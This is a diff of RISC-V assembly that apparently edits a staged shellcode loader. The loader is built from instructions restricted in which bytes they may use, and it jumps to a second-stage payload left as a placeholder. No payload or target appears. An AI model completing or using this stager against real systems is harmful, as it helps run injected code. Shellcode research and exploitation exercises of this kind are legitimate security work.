@@ -12,10 +12,10 @@ _start:
         addi    s0, s0, 0x7f7
         addi    s0, s0, 0x7f7
 #The 8-bit is not allowed in set of addi
-#Current Total: 212 (218, test)
+#Current Total: 220 (222, test)
         addi    s0, s0, 114
 	addi	s0, s0, 54
-	addi	s0, s0, 52
+	addi	s0, s0, 54
 
 # load 8 bytes of 0x0F into a7
 	c.and 	a5, a0
@@ -94,12 +94,12 @@ _start:
 	c.sub	s1, a5
 ## jump to stage 2
 	lui	a6, 0xe4484
-	c.mv	a1, sp
-	c.mv	t6, t3
-	c.jr	a1
+	c.mv	a5, sp
+	lui	a6, 0xe4484
+	c.jr	a5
 
 1:
-	j 0b
+	c.j	0b
 	.data
 payload:
 # SECOND STAGE SUBSTITUTED HERE
